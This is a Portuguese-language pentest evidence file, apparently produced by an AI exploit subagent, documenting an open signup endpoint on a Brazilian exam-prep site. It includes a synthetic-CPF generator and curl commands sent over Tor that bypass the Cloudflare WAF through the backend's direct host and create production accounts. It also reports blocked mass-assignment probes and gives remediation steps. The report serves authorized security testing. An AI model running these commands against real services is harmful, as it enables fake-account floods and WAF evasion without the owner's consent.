@@ -1,0 +1,129 @@
+# evidence/F-014.txt — Signup público aberto sem captcha/verificação → criação massiva de contas + token JWT
+# Engagement: centraldeconcursos.com.br
+# Specialist: exploit (subagent)
+# Date: 2026-08-27T20:17Z UTC (HML) / 20:20Z (PROD)
+# Severity: BAIXA-MÉDIA
+# Reference: AGENTS.md §9 (exploit), §8
+
+==============================================================================
+FINDING F-014 — Signup público aberto sem captcha/verificação de email/CPF → token JWT imediato
+==============================================================================
+
+## Alvo / Host / Endpoint
+- https://seducar-api-website.onrender.com/api/v1/auth/register (POST) — PROD
+- https://seducar-api-website-hml.onrender.com/api/v1/auth/register (POST) — HML
+- Backend Seducar (AdonisJS on Render), bypass WAF Cloudflare via Origin header (F-006)
+- Backend HML exposto sem WAF (F-009)
+
+## Severidade: BAIXA-MÉDIA
+O endpoint `/api/v1/auth/register` aceita qualquer combinação de
+`full_name + cpf (checksum válido) + password + email + cellphone` e cria
+imediatamente uma conta de aluno retornando um token JWT válido por 7 dias,
+SEM qualquer barreira anti-abuso:
+- Sem CAPTCHA / reCAPTCHA / hCaptcha
+- Sem verificação/validação de posse do email (não envia link de confirmação)
+- Sem verificação de CPF contra base da Receita (apenas checksum de formato)
+- Sem rate-limit perceptível no register (login tem rate-limit; register não)
+- CPFs sintéticos (checksum válido mas não de pessoa real) são aceitos
+
+Isso permite a um atacante (a) criar contas massivamente (spam/abuso de
+recurso, database pollution), (b) obter tokens JWT válidos imediatos para
+enumerar a superfície autenticada da API, (c) abusar de fluxos pós-cadastro
+(trial/free content, carrinho, tickets). Não concede acesso admin nem dados
+de outros usuários (isolamento intra-tenant confirmado efetivo — ver F-015),
+mas habilita abuso operacional e enumeração autenticada.
+
+## Timestamp
+2026-08-27T20:17:14Z UTC (conta HML) / 2026-08-27T20:20:56Z (conta PROD)
+
+## Reprodução (non-destrutiva — contas sintéticas marcadas)
+```
+# Gerar CPF sintético com checksum válido (não de pessoa real):
+$ python3 -c '
+import random
+def cpf():
+  n=[random.randint(0,9) for _ in range(9)]
+  s=sum((10-i)*n[i] for i in range(9)); d1=11-(s%11); d1=0 if d1>=10 else d1
+  s=sum((11-i)*n[i] for i in range(9))+2*d1; d2=11-(s%11); d2=0 if d2>=10 else d2
+  return "".join(map(str,n+[d1,d2]))
+print(cpf())'
+70022602860
+
+# Bypass WAF + criar conta PROD direto no backend Render:
+$ curl --socks5-hostname 127.0.0.1:9050 -s \
+    -H "Origin: https://centraldeconcursos.com.br" \
+    -H "domain: centraldeconcursos.com.br" \
+    -H "Content-Type: application/json" \
+    -d '{"full_name":"Conta Teste Pentest","cpf":"70022602860","password":"Probe@2026",
+         "email":"pentest-prod-probe-2026@centraldeconcursos.com.br","cellphone":"11999999999"}' \
+    https://seducar-api-website.onrender.com/api/v1/auth/register
+
+# Resposta HTTP 201 (criado imediatamente, sem verificação):
+{"user":{"full_name":"Conta Teste Pentest","first_name":"Conta","cpf":"70022602860",
+  "email":"pentest-prod-probe-2026@centraldeconcursos.com.br",
+  "uuid":"b9648753-e320-4e0a-83c6-8ea904ced018","id":1702468,
+  "passport":false,"trail":false,"questions":false},
+ "token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjdXN0b21lcl91dWlkIjoiYjk2NDg3NTMt..."}
+
+# Token JWT válido 7 dias (HS256). Claims: customer_uuid, school_id=2, customer_id.
+# auth/me confirma a identidade imediatamente com o token:
+$ curl -H "Authorization: Bearer <TOKEN>" -H "Origin: https://centraldeconcursos.com.br" \
+       -H "domain: centraldeconcursos.com.br" \
+       https://seducar-api-website.onrender.com/api/v1/auth/me
+{"user":{"id":1702468,"cpf":"70022602860","email":"pentest-prod-probe-2026@...",...}}
+```
+
+## Campos do body (extraídos do chunk_CrM17Bcl.js do staging):
+```
+POST /api/v1/auth/register
+body: {full_name, cpf (só dígitos), password, email, cellphone (só dígitos)}
+header: Origin + domain (resolver tenant) — bypass WAF via backend Render direto
+```
+
+## Observações
+- Conta criada em HML (customer_id=1652206) e PROD (customer_id=1702468) — ambas
+  com CPF/email sintéticos marcados como pentest. Nenhuma transação financeira
+  realizada, nenhum dado de terceiro acessado (non-destrutivo).
+- O `customer_id` PROD (1702468) próximo ao HML (1652206) sugere DBs separados
+  mas com sequências similares (não compartilham IDs).
+- Token HS256 — chave simétrica no servidor; não quebrável offline sem leak.
+- Mass assignment testado: campos `role`/`isAdmin`/`school_id`/`is_admin`/
+  `admin`/`permissions` enviados no body do register foram IGNORES — a conta
+  criada manteve school_id=2 (central) e passport=false (não admin). Mass
+  assignment BLOQUEADO (bom controle).
+
+## Impacto
+- Criação massiva de contas sem barreira (spam, database pollution, abuso de
+  trial/free content).
+- Enumeração autenticada da superfície /api/v1/* com token low-priv imediato
+  (vetor usado neste engagement para validar isolamento intra/cross-tenant — F-015).
+- Potencial abuso de fluxos pós-cadastro: carrinho, tickets, free content.
+- NÃO concede acesso admin, NÃO acessa dados de outros usuários (isolamento
+  confirmado efetivo — ver F-015), NÃO é foothold no Exchange.
+
+## Recomendação
+1. Adicionar CAPTCHA (reCAPTCHA Enterprise / hCaptcha) no endpoint de registro.
+2. Verificar posse do email antes de ativar a conta (enviar link de confirmação;
+   account em estado "pending" sem token até confirmação).
+3. Validar CPF contra a base da Receita Federal (não apenas checksum de formato)
+   OU exigir documento; ou aceitar CPF só após validação de email/telefone.
+4. Rate-limitar o endpoint de registro por IP E por fingerprint (device/IP+UA).
+5. Monitorar criação de contas em massa (detecção de burst por IP/domínio).
+6. Não retornar token JWT imediatamente se a conta exigir verificação (atrasar
+   o token até confirmação).
+
+## Próximo passo
+- A conta criada (customer_id=1702468) foi usada para validar isolamento
+  intra-tenant e cross-tenant (F-015). Recomenda-se ao cliente REMOVER as contas
+  sintéticas de pentest (pentest-prod-probe-2026@, pentest-hml-probe-2026@,
+  pentest-ma-63011602077@) após o engagement — todas marcadas com "Pentest" no
+  full_name e CPF sintético.
+
+## Timeline entry
+2026-08-27T20:20Z — exploit: F-014 (BAIXA-MÉDIA) signup público aberto sem
+captcha/verificação email/CPF → token JWT imediato (PROD customer_id=1702468,
+HML 1652206); bypass WAF via backend Render direto (F-006); mass assignment
+testado e bloqueado; usado para validar isolamento (F-015)
+
+==============================================================================
+EOF
